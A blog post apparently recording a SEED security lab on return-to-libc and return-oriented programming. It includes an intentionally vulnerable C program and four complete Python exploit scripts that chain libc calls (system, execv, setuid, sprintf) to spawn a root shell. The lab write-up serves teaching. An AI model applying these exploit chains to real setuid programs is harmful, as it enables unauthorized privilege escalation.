---
layout: post
title: Return to libc
excerpt: Return to libc is used to bypass stack protection mechanisms by using existing code fragments from the program's libc library. The libc library contains various functions that are commonly used by many programs, such as system calls like execve or system. By overriding the return address of a function with the address of these libc functions and providing suitable arguments on the stack, the attacker can redirect the program's execution to call these functions with their desired actions.
categories: [libc, rop]
---

A buffer overflow attack occurs when a program or process writes more data into a buffer than it can handle. Attackers then take advantage of this to overflow malicious code and execute it to gain unauthorized access or run arbitrary commands. However, the attack is successful because attackers can execute code on the stack, so to prevent a successful buffer overflow attack, security mechanisms that prevent executing code on the stack are now incorporated in kernels. Attackers have found a way to bypass these protections; one such method is using functions that are already present in the program, specifically the libc library.

Return to libc is used to bypass stack protection mechanisms by using existing code fragments from the program's libc library. The libc library contains various functions that are commonly used by many programs, such as system calls like execve or system. By overriding the return address of a function with the address of these libc functions and providing suitable arguments on the stack, the attacker can redirect the program's execution to call these functions with their desired actions.

In this post, I aim to document my findings and observations while performing a SEED lab.

Lab constraints:
- Address space randomization is turned off.
- Binary is compiled without the StackGuard Protection Scheme.
- Non-Executable Stack is enabled.

<details>
<summary>The Vulnerable Program</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));      

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);

    strcpy(buffer, str);   

    return 1;
}

void foo(){
    static int i = 1;
    printf("Function foo() is invoked %d times\n", i++);
    return;
}

int main(int argc, char **argv)
{
   char input[1000];
   FILE *badfile;

   badfile = fopen("badfile", "r");
   int length = fread(input, sizeof(char), 1000, badfile);
   printf("Address of input[] inside main():  0x%x\n", (unsigned int) input);
   printf("Input size: %d\n", length);

   bof(input);

   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
   return 1;
}
```

</details>

<br>

### Finding out the addresses of libc functions

The libc library will be loaded into memory when our program is executed, and because memory address randomization is turned off, the library is always loaded into the same memory address for the same program. Using gdb, we can find out the memory address of system() or execv(), as this is the function we would use for the aatck.

When we run gdb on the vulnerable program, we execute the following commands to determine the memory address of system(), execv(), and exit().

```assembly
b main
run
p system
p execv
p exit
```

![task-1-a](https://github.com/iukadike/blog/assets/58455326/ffc4f20f-2365-499c-b547-48b5e91b9f90)


<br>

### Putting the shell string in the memory

Since we want to execute `/bin/sh` using `system()`, we first need to get `/bin/sh` into the memeory and pass its address to `system()`. This is because the `system()` function is defined as `system(const char *command)`. There are different ways to achieve this goal.

#### Using the string in libc

We know for a fact that the string `/bin/sh` is present in the libc library. We also know that the libc library is loaded into memory when the program is run. This means that if we can determine the memory address where `/bin/sh` resides, we can supply this address to `system()`.

In `gdp-peda`, we can directly search for this string and get the memory address.

```assembly
find "/bin/sh"
```

![task-2-a](https://github.com/iukadike/blog/assets/58455326/218c5e2d-c34a-43c5-919a-1e3bd55e3e46)


Another method is to inspect the memory layout of the vulnerable program, find the start address of the libc library, and add the offset of `/bin/sh` found within the library.

```assembly
gdb-peda$ info proc map
```

![task-2-b](https://github.com/iukadike/blog/assets/58455326/c4710fd6-6af9-40b7-a179-f55ef0400f56)


Next, use the strings utility to find the offset of `/bin/sh` relative to the start of the libc library.

```bash
strings -a -tx /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
```

`-a` tells the strings utility to print out every string it finds in the file.
`-tx` tells the strings utility to print the offset of the string from the beginning of the file.

![task-2-c](https://github.com/iukadike/blog/assets/58455326/437d21e0-8ca7-4ef0-bcf0-045cb28f3b04)


Finally, by adding the offset obtained to the start address of the libc library in memory, we can get the address of `/bin/sh`. This address can be verified by running the following in gdb:

``
x/s 0xf7f5c352
``

![task-2-d](https://github.com/iukadike/blog/assets/58455326/78f76f31-9005-49e0-916a-14439816b495)


#### Using Environment Variables

When we execute a program from a shell prompt, a child process is started, and all the exported shell variables become the environment variables of the child process. Thus, we can export a new shell variable to be part of the vulnerable program when it runs.

```sh
export MYSHELL=/bin/sh
```

We then use the address of this variable as an argument to `system()`. The location of this variable is on the stack and can be obtained in `gdb-peda` by searching for it:

```assembly
find "/bin/sh"
```

![task-2-e](https://github.com/iukadike/blog/assets/58455326/3dea2f1f-d7be-4709-a05c-364d68251641)


However, because the program is run in gdb, gdb also puts some information on the stack, and thus the memory address we get via find is not so reliable. We can instead write a program that will print out the memory address of the environment variable.

```c
#include <stdio.h>
#include <stdlib.h>

void main(){
    char*shell =  getenv("MYSHELL");
    if (shell)
        printf("%x\n", (unsigned int)shell);
}
```

![task-2-f](https://github.com/iukadike/blog/assets/58455326/17272b7e-8c09-4ebf-8ff5-04586694537f)


It is important to note that the program must be compiled with the same options as that of the vulnerable program (i.e., 32-bit or 64-bit), and the output binary must have the same name length as the vulnerable program.

<br>

### Launching the Attack

After obtaining the memory addresses of `system()`, `exit()`, and `/bin/sh`, we are ready to create our exploit. 

The stack will be built as:

```
Address of the /bin/sh string
Address of the exit() function
Address of the system() function (this will overwrite the original return address)
```

To determine where to place the addresses we obtained, we need to know the offset of the original return address from the start of the buffer. This can be determined by "($ebp - &buffer) + 4". We can recompile the binary with the debugging flag turned on (`gcc -g`) and obtain the values of ebp and buffer. However, the vulnerable program already prints these values for us.

![task-3-a](https://github.com/iukadike/blog/assets/58455326/941126df-35e6-408e-8ddd-89596b295ede)


We can then plug in the necessary values to produce our exploit.
```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# $ebp - &buffer = 22

X = 22 + 4
system_addr = 0xf7e12420   # The address of system()
content[X:X+4] = (system_addr).to_bytes(4,byteorder='little')

Y = X + 4
exit_addr = 0xf7e04f80     # The address of exit()
content[Y:Y+4] = (exit_addr).to_bytes(4,byteorder='little')

Z = Y + 4
sh_addr = 0xf7f5c352       # The address of "/bin/sh"
content[Z:Z+4] = (sh_addr).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

When we run the program, the exploit executes successfully and we obtain a shell

![task-3-b](https://github.com/iukadike/blog/assets/58455326/a4049747-9eef-48fa-a490-2488dfcd5100)


<br>

### Defeat Shell’s countermeasure

Though our vulnerable program has a set-UID privilege, the shell that spawns does not have root privileges. This means that the shell drops the Set-UID privilege. However, if the shell is spawned with the `-p` 
option, the shell retains the set-UID privilege.

Because `system()` function does not provide a way for us to supply arguments, we have to make use of any other function that allows such. One of these functions is the `execv()` function. The function takes two arguments: one is the address of the command, and the second is the address of the argument array for the command. `execv()` is defined as `execv(const char *pathname, char *const argv[])`

For example, if we want to invoke "/bin/bash -p" using execv, we need to set up the following:
pathname = address of "/bin/bash"
argv[0] = address of "/bin/bash"
argv[1] = address of "-p"
argv[2] = NULL (i.e., 4 bytes of zero).

The stack will be built as:

```
Address of argv[] (where argv[] is the pointer to the argv[0] address, which is followed sequentially by argv[1] and argv[2])
Address of the /bin/bash string
Address of the exit() function
Address of the execv() function (this will overwrite the original return address)
```

We already know the address of `execv()` and `exit()`. To get the addresses of `-p` and `/bin/bash`, we can export them as environment variables and write a program that will print out the memory addresses of the environment variables.

```bash
export MYSHELL=-p
export SHELL=/bin/bash
```

```c
#include <stdio.h>
#include <stdlib.h>

void main(){
    /* -p */
    char*env1 =  getenv("MYSHELL");
    if (env1){
        printf("-p --> %x\n", (unsigned int)env1);
    }
    
    /* /bin/bash */
    char*env2 =  getenv("SHELL");
    if (env2){
        printf("/bin/bash --> %x\n", (unsigned int)env2);
    }
}
```

![task-4-a](https://github.com/iukadike/blog/assets/58455326/953fed06-644b-43b1-bd19-06541d2a55e6)


Now we know the addresses of `/bin/bash` and `-p`. All that's left is to build our exploit code.

To determine where to place the addresses we obtained, we need to know the offset of the original return address from the start of the buffer. This can be determined by "($ebp - &buffer) + 4". We can recompile the binary with the debugging flag turned on (`gcc -g`) and obtain the values of ebp and buffer. However, the vulnerable program already prints these values for us.

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# Record the addresses
execv_addr = 0xf7e994b0         # The address of execv()
bash_addr = 0xffffd448          # The address of "/bin/bash"
exit_addr = 0xf7e04f80          # The address of exit()
argv1_addr = 0xffffd45a         # The address of "-p" argument
input_main_addr = 0xffffcdf0    # The address of the input in main()

#################################################
# argv[] needs to consist of the following:     #
# Address of argv[0]  = address of "/bin/bash"  #
# Address of argv[1]  = address of "-p"         #
# Address of argv[2]  = NULL                    #
#################################################

# build argv[] close to the end of the file
offset = 300 - (3 * 4)          # we have argv[0] to argv[2]
content[offset:offset+4] = (bash_addr).to_bytes(4,byteorder='little')
content[offset+4:offset+8] = (argv1_addr).to_bytes(4,byteorder='little')
content[offset+8:offset+12] = (0x00).to_bytes(4,byteorder='little')

argv_addr = input_main_addr + offset

###########################################################################
# The stack is built the following way from high address to low address:  #
# Address of argv[]                                                       #
# Address of /bin/bash string                                             #
# Address of exit()                                                       #
# Address of execv()                                                      #
###########################################################################

# $ebp - &buffer = 22
ret = 22 + 4

# build the stack
content[ret:ret+4]     = (execv_addr).to_bytes(4,byteorder='little')
content[ret+4:ret+8]   = (exit_addr).to_bytes(4,byteorder='little')
content[ret+8:ret+12]  = (bash_addr).to_bytes(4,byteorder='little')
content[ret+12:ret+16] = (argv_addr).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

<details>
<summary>Code Explanation</summary>

Unlike the previous code, where we did not need to build using the stack (all we needed was already present in memory), we need to dynamically build the arguments for execv. However, we cannot use the buffer in bof() because the buffer size is very small. But our code is already present in memory in the main() function. So instead of building using `buffer` in bof(), we build using `input` in main(). This is why we need the address of the input in main. In other words, we use the buffer in main() because the buffer in bof() is quite small and cannot fit what we want to store.

</details>

When we run the exploit to generate the badfile and run the vulnerable program, the exploit succeeds and we obtain a root shell.

![task-4-b](https://github.com/iukadike/blog/assets/58455326/2f9a49ff-f991-43d4-b334-f931ea96bd29)


<br>

### Return-Oriented Programming

ROP overcomes these protections by reusing existing code snippets, known as "gadgets," rather than injecting new code into memory. A gadget is a small sequence of instructions ending in a "return" instruction (ret) that pops the top stack value into the instruction pointer (IP) register, effectively changing the program's flow.

An attacker constructs a payload consisting of a series of gadgets to achieve their intended actions. By cleverly chaining these gadgets together, they can manipulate the program's execution flow and achieve their objective, such as running shellcode or gaining elevated privileges.

The ROP technique has gained significant popularity due to its effectiveness against modern security measures, such as NX and DEP, as it leverages existing code rather than injecting new code into protected memory regions. However, it requires a deep understanding of the target system's memory layout and instruction set to identify suitable gadgets and construct a successful ROP payload.

#### Invoke foo() 10 times before spawing a shell.

This task asks students to work on a special case of ROP. In the vulnerable program, there is a function called foo(), which is never called in the program. That function
is intended for this task. The student's job is to exploit the buffer-overflow problem in the program, so when the program returns from the bof() function, it invokes foo() 10 times before spawing a shell.

The stack will be built as:

```
Address of the /bin/sh string
Address of the exit() function
Address of the system() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function
Address of the foo() function (this will overwrite the original return address)
```

The address of `foo()` can be obtained by runnning the vulnerable program in gdb and executing the following:

```asssembly
b main
run
p foo
```

The exploit can be created using the following python code

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values up to $ebp
# $ebp - &buffer = 22
content = bytearray(0xaa for i in range(22))

# Function to set endianess
def tobytes(value):
    return value.to_bytes(4,byteorder='little')

# Record the addresses
system_addr = 0xf7e12420        # The address of system()
exit_addr   = 0xf7e04f80        # The address of exit()
sh_addr     = 0xf7f5c352        # The address of "/bin/sh"
foo_addr    = 0x565562b0        # The address of foo()
popret      = 0x56556022        # The address of pop; ret gadget

###########################################################################
# The stack is built the following way from high address to low address:  #
# Address of the /bin/sh string                                           #
# Address of the exit() function                                          #
# Address of the system() function                                        #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
# Address of the foo() function                                           #
###########################################################################


# build the stack dymanically
content += b'BBBB'
# foo()
for i in range(10):
    content += tobytes(foo_addr)
#system()
content += tobytes(system_addr)
content += tobytes(popret)
content += tobytes(sh_addr)
#exit()
content += tobytes(exit_addr)


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

When the vulnerable program is run, we see that the exploit is successful and we get a taste of rop

![task-5-a](https://github.com/iukadike/blog/assets/58455326/e16ff31a-8f89-4056-8072-835359514365)



#### Chain setuid() and system()

One way to solve the problem of deafeating shell's countermeasure is to invoke setuid(0) before invoking system(). This approach requires us to chain two functions.
together.

The stack will be built as:

```
Address of the exit() function
Address of arg[0] for system() function
pop; ret
Address of the system() function
Address arg[0] for setuid() function
pop; ret
Address of the setuid() function (this will overwrite the original return address)
```

we can use the `ropgadget` command while debugging the vulnerable program to get the address of the gadget we are interested in using

![task-5-b](https://github.com/iukadike/blog/assets/58455326/a5be1d76-9902-4c3d-b99f-0086472ec6d9)


Since both `setuid()` and `system()` take one argument, we are interested in the address of `popret` gadget. `sprintf()` takes two arguments, thus we also need `pop2ret`

- one argumet:    popret
- two argumets:   pop2ret
- three argumets: pop3ret
- four argumets:  pop4ret

The address of `system()`, `sprintf()` and `setuid()` can be obtained by runnning the vulnerable program in gdb and executing the following:

```asssembly
b main
run
p system
p sprintf
p setuid
```

The exploit can be created using the following python code

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values up to $ebp
# $ebp - &buffer = 22
content = bytearray(0xaa for i in range(22))

# Function to set endianess
def tobytes(value):
    return value.to_bytes(4,byteorder='little')

# Record the addresses
system_addr     = 0xf7e12420        # The address of system()
exit_addr       = 0xf7e04f80        # The address of exit()
sh_addr         = 0xf7f5c352        # The address of "/bin/sh"
setuid_addr     = 0xf7e99e30        # The address of setuid()
sprintf_addr    = 0xf7e20e40        # The address of sprintf()
popret          = 0x56556022        # The address of pop; ret gadget
pop2ret         = 0x56556412        # The address of pop pop; ret gadget
ebp             = 0xffffcdd8        # The address of the frame pointer in bof()

#########################################################
# sprintf() needs two arguments                         #
# arg1: destination to write string read from source    #
# arg2: source to get string to write into destination  #
#########################################################
sprintf_arg1 = ebp + 76                    # Address of arg for setuid()
sprintf_arg2 = sh_addr + len("/bin/sh")    # /x0

###########################################################################
# The stack is built the following way from high address to low address:  #
# Address of exit()                                                       #
# Address of arg[0] for system() = /bin/sh                                #
# Address of popret gadget                                                #
# Address of system()                                                     #
# Address of arg[0] for setuid() = 0                                      #
# Address of popret gadget                                                #
# Address of setuid()                                                     #
# Address of arg[1] for sprintf() = source = /x0                          #
# Address of arg[0] for sprintf() = destination  = $ebp+76                #
# Address of pop2ret gadget                                               #
# Address of sprintf()     - do four times                                #
###########################################################################

# build the stack dymanically
content += b'BBBB'
# sprinf()
for i in range(4):
    content += tobytes(sprintf_addr)
    content += tobytes(pop2ret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    sprintf_arg1 += 1
# setuid()
content += tobytes(setuid_addr)
content += tobytes(popret)
content += tobytes(0xFFFFFFFF)
# system()
content += tobytes(system_addr)
content += tobytes(popret)
content += tobytes(sh_addr)
# exit()
content += tobytes(exit_addr)


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

<details>
<summary>Code Explanation</summary>

```python
content = bytearray(0xaa for i in range(22))
```
We need to construct our payload to start right after ebp because that is where we can overwrite the return address of the bof() function. From the analysis, we can get the size by subtracting the ebp address from the buffer address. In this case, the size was 22. It will be different for everyone based on the buffer size.

___

```python
def tobytes(value):
    return value.to_bytes(4,byteorder='little')
```

Because our CPU is intel and uses little endianess, we have to make sure that the addresses we inject into the payload are also in little endianess so that the CPU can interpret them correctly. We use this function to format our data to little endianess.

___

```python
sprintf_arg1 = ebp + 76                    # Address of arg for setuid()
sprintf_arg2 = sh_addr + len("/bin/sh")    # /x0
```

We would be using setuid() in our payload and would need to supply the value of zero to setuid(). However, if we put zeros in our payload, when strcpy() encounters this, it terminates and makes our exploit unsuccessful. To counter this, we need to find a way of supplying setuid() with zero without actually hardcoding zero in our payload.

To remedy this, we use sprintf(), which reads the value from an address and writes it to another address. We know strings are null terminated; therefore, our "/bin/sh" string already in memory is "/bin/sh/x0". So all we have to do is read the null byte in "/bin/sh" and copy it to the memory address where setuid() would read. The null byte would be at `sh_addr + len("/bin/sh")`

But we also need to determine the memory address where setuid() would read. We can do this by calculating the length of all the instructions that will come before that address. Our stack would be built as thus:

- sprintf()  --> 4bytes
- pop2ret()  --> 4bytes
- arg1       --> 4bytes
- arg2       --> 4bytes

This would make a total of 16 bytes. However, we need to call sprintf() four times. (The reason for this would be explained in later code.) This brings the total to 16*4 = 64 bytes.

We continue building the stack.

- setuid()  --> 4bytes
- popret()  --> 4bytes
- arg       --> 4bytes

This would make a total of 16 bytes, bringing the total to 64+8 = 72 bytes. We also need to account for the original return address from EBP, which is 4 bytes. This brings the total to 76 bytes.

Thus, we need sprintf() to overwrite this memory address with null bytes.

___

```python
content += b'BBBB'
```

We would need to advance to the original return address and overwrite it. Thus, we use 4 bytes of data to advance to the return address.

___

```python
for i in range(4):
    content += tobytes(sprintf_addr)
    content += tobytes(pop2ret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    sprintf_arg1 += 1
```

As earlier stated, we would need to use sprintf() to provide the zeros for setuid(). When we use the sprintf() function, what we copy is just a single null byte; however, we need four null bytes. This is why we run sprintf() four times. While doing so, we also shift the memory address where setuid() would read by one byte so that at the end of the operation, the address would have \x00\x00\x00\x00.

___

Finally, we call setuid(), system() and exit()

</details>

When the vulnerable program is run, we see that the exploit is successful and we obtain a root shell.

![task-5-c](https://github.com/iukadike/blog/assets/58455326/0a02219d-47ac-4513-92a7-efb4190f4968)



<br>

Thanks for reading.

<details>
<summary>References</summary>

- [Red Team Notes - return-to-libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

- [Red Team Notes - ROP](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming)

</details>
